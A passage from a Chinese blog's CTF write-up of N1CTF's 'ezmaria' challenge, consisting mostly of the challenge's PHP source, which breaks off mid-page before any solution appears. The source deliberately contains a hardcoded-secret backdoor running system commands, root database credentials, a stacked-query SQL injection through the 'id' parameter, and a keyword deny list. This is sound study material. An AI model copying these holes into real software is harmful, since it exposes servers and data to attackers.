@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="false" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>n1ctf-ezmaira | Delete&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="没想到吧，又是lolita师傅出的题因为当时N1CTF没解出来，所以找了lolita师傅开了个环境复现一下，在此特别感谢lolita师傅 进来还是直接load_file() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1ctf-ezmaira">
+<meta property="og:url" content="http://example.com/2023/11/03/n1ctf-ezmaira/index.html">
+<meta property="og:site_name" content="Delete&#39;s blog">
+<meta property="og:description" content="没想到吧，又是lolita师傅出的题因为当时N1CTF没解出来，所以找了lolita师傅开了个环境复现一下，在此特别感谢lolita师傅 进来还是直接load_file() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/03/n1ctf-ezmaira/1.png">
+<meta property="og:image" content="http://example.com/2023/11/03/n1ctf-ezmaira/3.png">
+<meta property="article:published_time" content="2023-11-03T05:19:58.000Z">
+<meta property="article:modified_time" content="2023-11-03T05:24:05.112Z">
+<meta property="article:author" content="DELETE">
+<meta property="article:tag" content="-CTF -WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/03/n1ctf-ezmaira/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Delete's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Delete's blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+      <a class="main-nav-link" href="/friend">friend</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+      <a class="nav-dropdown-link" href="/friend">friend</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/1.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">DELETE </div>
+      <div class="dot"></div>
+      <div class="subtitle">成为那耀眼的光 </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/ML-hacker" title="ML-hacker"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/CTF/">
+                CTF
+                <div class="category-count">5</div>
+            </a>
+        
+            <a class="category-link" href="/categories/%E5%AE%9E%E6%88%98/">
+                实战
+                <div class="category-count">2</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF-WP/" rel="tag">-CTF -WP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Archives</h3>
+      
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          November 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          October 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/09 ">
+          September 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2023/11/03/n1ctf-ezmaira/" title="n1ctf-ezmaira" >
+            <div class="recent-link-text">
+              n1ctf-ezmaira
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/10/31/ACTF/" title="ACTF2023 WP" >
+            <div class="recent-link-text">
+              ACTF2023 WP
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/10/27/PHP-parameter/" title="PHP中非法参数名问题分析" >
+            <div class="recent-link-text">
+              PHP中非法参数名问题分析
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/10/21/%E5%A4%A9%E5%B1%B1/" title="天山固网线上赛WP" >
+            <div class="recent-link-text">
+              天山固网线上赛WP
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/09/13/lolita-N1/" title="udf导出表" >
+            <div class="recent-link-text">
+              udf导出表
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-n1ctf-ezmaira" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        n1ctf-ezmaira
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-11-03T05:19:58.000Z" itemprop="datePublished">2023-11-03</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/CTF/">CTF</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.2k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WP/" rel="tag">-CTF -WP</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>没想到吧，又是lolita师傅出的题<br>因为当时N1CTF没解出来，所以找了lolita师傅开了个环境复现一下，在此特别感谢lolita师傅</p>
+<p>进来还是直接load_file()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//for n1ctf ezmariadb secret cmd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&quot;secret&quot;</span>] === <span class="string">&quot;lolita_love_you_forever&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ps -ef` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ps -ef&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /var/www/html/` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /var/www/html/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`find /mysql` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;find /mysql&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;can you get shell?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//lolita init db</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbn</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"><span class="comment">//die();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="comment">//$conn = new PDO(&quot;mysql:host=$servername;&quot;, $username, $password);</span></span><br><span class="line"><span class="comment">//aaa();</span></span><br><span class="line"><span class="variable">$err</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//$conn = new PDO(&quot;mysql:host=$servername;dbname=$dbn&quot;, $username, $password);</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbn</span>);</span><br><span class="line">    <span class="comment">//echo &quot;连接成功&quot;; </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//echo $e-&gt;getMessage();</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$err</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// avoid attack</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;select name, price from items where id = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//$result = $conn-&gt;query($cmd);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//die(&quot;连接失败: &quot; . $conn-&gt;connect_error);</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$err</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;数据库坏了喵\\n&quot;</span>. <span class="variable">$err</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">more_results</span>() &amp;&amp; <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">next_result</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$result</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">var_export</span>(<span class="variable">$result</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;报错了喵\\n&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;注一下试试呗~❤&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span></span><br><span class="line">        href=<span class="string">&quot;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic&amp;amp;display=swap&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">masthead</span>&quot;</span></span><br><span class="line"><span class="class">        <span class="title">style</span>=&quot;<span class="title">background</span>:<span class="title">url</span>(\&#x27;<span class="title">https</span>://<span class="title">www</span>.<span class="title">dmoe</span>.<span class="title">cc</span>/<span class="title">random</span>.<span class="title">php</span>\&#x27;)<span class="title">no</span>-<span class="title">repeat</span> <span class="title">center</span> <span class="title">center</span>;<span class="title">background</span>-<span class="title">size</span>:<span class="title">cover</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">lolitafont</span>&quot;&gt;&lt;<span class="title">h1</span>&gt;<span class="title">Nu1l</span> <span class="title">Store</span>&lt;/<span class="title">h1</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">xl</span>-9 <span class="title">mx</span>-<span class="title">auto</span> <span class="title">position</span>-<span class="title">relative</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-5&quot;&gt;<span class="title">What</span> <span class="title">do</span> <span class="title">you</span> <span class="title">want</span> <span class="title">to</span> <span class="title">buy</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-10 <span class="title">col</span>-<span class="title">lg</span>-8 <span class="title">col</span>-<span class="title">xl</span>-7 <span class="title">mx</span>-<span class="title">auto</span> <span class="title">position</span>-<span class="title">relative</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">get</span>&quot; <span class="title">action</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-12 <span class="title">col</span>-<span class="title">md</span>-9 <span class="title">mb</span>-2 <span class="title">mb</span>-<span class="title">md</span>-0&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span> <span class="title">form</span>-<span class="title">control</span>-<span class="title">lg</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">id</span>&quot;</span></span><br><span class="line"><span class="class">                                    <span class="title">placeholder</span>=&quot;<span class="title">lolita</span> <span class="title">love</span> <span class="title">U</span>&quot; &gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span 